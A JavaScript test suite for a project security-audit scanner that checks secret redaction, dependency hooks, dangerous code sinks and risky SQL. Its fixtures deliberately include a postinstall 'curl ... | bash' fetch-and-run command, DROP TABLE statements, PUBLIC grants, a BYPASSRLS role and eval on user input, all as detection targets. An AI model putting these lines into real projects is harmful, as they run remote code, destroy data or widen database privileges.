import test from "node:test";
import assert from "node:assert/strict";
import { mkdtemp, mkdir, rm, writeFile, symlink } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { scanProject } from "../src/adapters/filesystem/scan-project.js";
import { auditProject } from "../src/adapters/filesystem/audit-project.js";
import { projectRules } from "../src/specialists/project-rules.js";
import { RuleRegistry } from "../src/core/rule-registry.js";
import { ExpertQAEngine } from "../src/core/engine.js";
import projectConfig from "../config/project-audit.config.json" with { type: "json" };
import { formatReport } from "../src/reporters/index.js";

async function runRules(context) {
  const registry = new RuleRegistry();
  for (const rule of projectRules) registry.register(rule);
  return new ExpertQAEngine({ registry, config: projectConfig }).audit(context);
}

test("scanner reads supported source/manifests and parses package metadata", async () => {
  const root = await mkdtemp(join(tmpdir(), "jbqa-scan-"));
  try {
    await mkdir(join(root, "src"));
    await writeFile(join(root, "package.json"), JSON.stringify({ name: "fixture", dependencies: { example: "1.2.3" } }));
    await writeFile(join(root, "package-lock.json"), "{}");
    await writeFile(join(root, "src", "index.js"), "export const answer = 42;\n");
    const scan = await scanProject(root);
    assert.equal(scan.summary.filesRead, 3);
    assert.equal(scan.manifests[0].data.name, "fixture");
    assert.deepEqual(scan.lockFiles, ["package-lock.json"]);
    assert.ok(scan.files.some((file) => file.path === "src/index.js"));
  } finally {
    await rm(root, { recursive: true, force: true });
  }
});

test("scanner excludes dependencies, symlinks and local secret-file contents", async () => {
  const root = await mkdtemp(join(tmpdir(), "jbqa-scan-"));
  const outside = await mkdtemp(join(tmpdir(), "jbqa-outside-"));
  try {
    await mkdir(join(root, "node_modules", "fake"), { recursive: true });
    await writeFile(join(root, "src.js"), "export const app = true;");
    await writeFile(join(root, "node_modules", "fake", "index.js"), "eval('not scanned');");
    await writeFile(join(root, ".env"), "API_KEY=must-not-be-read-or-reported\n");
    await writeFile(join(root, ".env.example"), "API_KEY=your_placeholder_value\n");
    await writeFile(join(root, "service-account.json"), '{"private_key":"must-not-be-opened"}');
    await writeFile(join(root, "credentials.json"), '{"password":"must-not-be-opened-either"}');
    await writeFile(join(outside, "outside.js"), "external directory content");
    await symlink(outside, join(root, "linked-folder"), "dir");
    const scan = await scanProject(root);
    assert.equal(scan.files.some((file) => file.path.includes("node_modules")), false);
    assert.equal(scan.files.some((file) => file.path === ".env"), false);
    assert.deepEqual(scan.environmentFiles, [".env"]);
    assert.ok(scan.files.some((file) => file.path === ".env.example"));
    assert.deepEqual(scan.skippedSymlinks, ["linked-folder"]);
    assert.deepEqual(scan.sensitiveFiles, ["credentials.json", "service-account.json"]);
    assert.equal(JSON.stringify(scan).includes("must-not-be-read-or-reported"), false);
    assert.equal(JSON.stringify(scan).includes("must-not-be-opened"), false);
  } finally {
    await rm(root, { recursive: true, force: true });
    await rm(outside, { recursive: true, force: true });
  }
});

test("scanner applies size limits and rejects a file as its root", async () => {
  const root = await mkdtemp(join(tmpdir(), "jbqa-scan-"));
  try {
    await writeFile(join(root, "large.js"), "x".repeat(100));
    const scan = await scanProject(root, { maxFileBytes: 10 });
    assert.equal(scan.summary.filesRead, 0);
    assert.equal(scan.oversizedFiles.length, 1);
    await assert.rejects(scanProject(join(root, "large.js")), /real directory/);
  } finally {
    await rm(root, { recursive: true, force: true });
  }
});

test("security findings detect credential formats but redact values from reports", async () => {
  const secret = "ghp_" + "A".repeat(36);
  const report = await runRules({
    projectFiles: [{
      path: "src/config.js", extension: ".js", lineCount: 1,
      content: 'const GITHUB_TOKEN = "' + secret + '";'
    }],
    projectScan: { environmentFiles: [], sensitiveFiles: [] },
    packageManifests: []
  });
  const finding = report.diagnostics.find((item) => item.id.startsWith("SEC-SECRET-"));
  assert.ok(finding);
  assert.equal(finding.severity, "critical");
  assert.equal(finding.evidence.redacted, true);
  assert.equal(JSON.stringify(report).includes(secret), false);
});

test("security checks ignore placeholders and detect dynamic code and HTML sinks", async () => {
  const report = await runRules({
    projectFiles: [{
      path: "src/app.js", extension: ".js", lineCount: 4,
      content: [
        'const API_KEY = "your_placeholder_value";',
        "const result = eval(userInput);",
        "element.innerHTML = value;",
        "// eval(commentedOut);"
      ].join("\n")
    }],
    projectScan: { environmentFiles: [], sensitiveFiles: [] },
    packageManifests: []
  });
  assert.equal(report.diagnostics.some((item) => item.id.startsWith("SEC-SECRET-")), false);
  assert.equal(report.diagnostics.some((item) => item.title === "Dynamic eval execution"), true);
  assert.equal(report.diagnostics.some((item) => item.title === "Direct HTML injection sink"), true);
});

test("dependency checks identify floating versions, absent locks and risky install hooks", async () => {
  const report = await runRules({
    projectFiles: [],
    projectScan: { lockFiles: [] },
    packageManifests: [{
      path: "package.json", parseError: null,
      data: {
        dependencies: { "some-package": "latest" },
        scripts: { postinstall: "curl https://example.invalid/install.sh | bash" }
      }
    }]
  });
  assert.equal(report.diagnostics.some((item) => item.id.startsWith("DEP-FLOAT-")), true);
  assert.equal(report.diagnostics.some((item) => item.id === "DEP-LOCK-001"), true);
  assert.equal(report.diagnostics.some((item) => item.id.startsWith("DEP-LIFECYCLE-")), true);
});

test("database checks flag destructive SQL, SECURITY DEFINER and unsafe raw-query calls", async () => {
  const report = await runRules({
    projectFiles: [
      { path: "migrations/002.sql", extension: ".sql", lineCount: 2, content: "DROP TABLE customers;\nCREATE FUNCTION run_job() SECURITY DEFINER AS $$ SELECT 1; $$ LANGUAGE SQL;" },
      { path: "src/db.ts", extension: ".ts", lineCount: 1, content: "return prisma.$queryRawUnsafe(query);" }
    ],
    projectScan: { lockFiles: [], environmentFiles: [], sensitiveFiles: [] },
    packageManifests: []
  });
  assert.equal(report.diagnostics.some((item) => item.id.startsWith("DB-DESTRUCTIVE-")), true);
  assert.equal(report.diagnostics.some((item) => item.id.startsWith("DB-POSTGRES-")), true);
  assert.equal(report.diagnostics.some((item) => item.id.startsWith("DB-RAW-")), true);
});

test("Prisma relation fields without a supporting leading index are reported", async () => {
  const report = await runRules({
    projectFiles: [{
      path: "prisma/schema.prisma",
      extension: ".prisma",
      lineCount: 16,
      content: [
        "model Order {",
        "  id String @id",
        "  ownerId String",
        "  owner User @relation(fields: [ownerId], references: [id])",
        "}",
        "",
        "model Invoice {",
        "  id String @id",
        "  customerId String",
        "  customer Customer @relation(fields: [customerId], references: [id])",
        "  @@index([customerId, createdAt])",
        "}"
      ].join("\\n")
    }],
    projectScan: { lockFiles: [], environmentFiles: [], sensitiveFiles: [] },
    packageManifests: []
  });
  const missing = report.diagnostics.filter((item) => item.id.startsWith("DB-PRISMA-INDEX-"));
  assert.equal(missing.length, 1);
  assert.match(missing[0].id, /Order-ownerId/);
  assert.equal(missing[0].metadata.foreignKeyField, "ownerId");
  assert.equal(missing[0].severity, "medium");
});

test("PostgreSQL rules flag broad PUBLIC grants and elevated role attributes", async () => {
  const report = await runRules({
    projectFiles: [{
      path: "migrations/003_permissions.sql",
      extension: ".sql",
      lineCount: 4,
      content: [
        "GRANT ALL PRIVILEGES ON ALL TABLES IN SCHEMA public TO PUBLIC;",
        "CREATE ROLE app_runtime WITH LOGIN NOSUPERUSER;",
        "ALTER ROLE app_runtime WITH BYPASSRLS;",
        "GRANT CREATE ON SCHEMA public TO PUBLIC;"
      ].join("\\n")
    }],
    projectScan: { lockFiles: [], environmentFiles: [], sensitiveFiles: [] },
    packageManifests: []
  });
  assert.equal(report.diagnostics.filter((item) => item.id.startsWith("DB-PUBLIC-GRANT-")).length, 2);
  assert.equal(report.diagnostics.filter((item) => item.id.startsWith("DB-PRIVILEGED-ROLE-")).length, 1);
  assert.equal(report.diagnostics.some((item) => item.id.startsWith("DB-PRIVILEGED-ROLE-") && item.severity === "high"), true);
});

test("scanner marks the result truncated when it reaches the depth limit", async () => {
  const root = await mkdtemp(join(tmpdir(), "jbqa-depth-"));
  try {
    await mkdir(join(root, "level-1", "level-2"), { recursive: true });
    await writeFile(join(root, "level-1", "level-2", "deep.js"), "export const deep = true;");
    const scan = await scanProject(root, { maxDepth: 1 });
    assert.equal(scan.summary.truncated, true);
    assert.equal(scan.files.some((file) => file.path.endsWith("deep.js")), false);
  } finally {
    await rm(root, { recursive: true, force: true });
  }
});

test("end-to-end project audit returns a safe report and exports Markdown/HTML", async () => {
  const root = await mkdtemp(join(tmpdir(), "jbqa-project-"));
  const secret = "ghp_" + "B".repeat(36);
  try {
    await mkdir(join(root, "src"));
    await writeFile(join(root, "package.json"), JSON.stringify({
      name: "fixture-erp", version: "1.0.0", dependencies: { "unsafe-example": "*" }
    }, null, 2));
    await writeFile(join(root, "src", "service.js"),
      'const GITHUB_TOKEN = "' + secret + '";\nconst output = eval(input);\n');
    await writeFile(join(root, "migrate.sql"), "DROP TABLE invoice_history;\n");
    await writeFile(join(root, ".env"), "TOKEN=not-read\n");

    const report = await auditProject(root);
    const serialized = JSON.stringify(report);
    assert.equal(report.target.project.startsWith("jbqa-project-"), true);
    assert.equal(report.summary.rulesExecuted, 15);
    assert.ok(report.diagnostics.some((item) => item.severity === "critical"));
    assert.equal(serialized.includes(secret), false);
    assert.equal(serialized.includes("not-read"), false);
    assert.equal(report.projectScan.environmentFiles, 1);
    assert.equal(report.analysisScope.networkRequests, 0);
    assert.equal(report.analysisScope.dependencyAdvisoryLookup, false);
    assert.match(formatReport(report, "markdown"), /Project files read/);
    assert.match(formatReport(report, "html"), /Target: <code>jbqa-project-/);
  } finally {
    await rm(root, { recursive: true, force: true });
  }
});

test("project audit rejects an empty path", async () => {
  await assert.rejects(auditProject(" "), /directory path is required/);
});
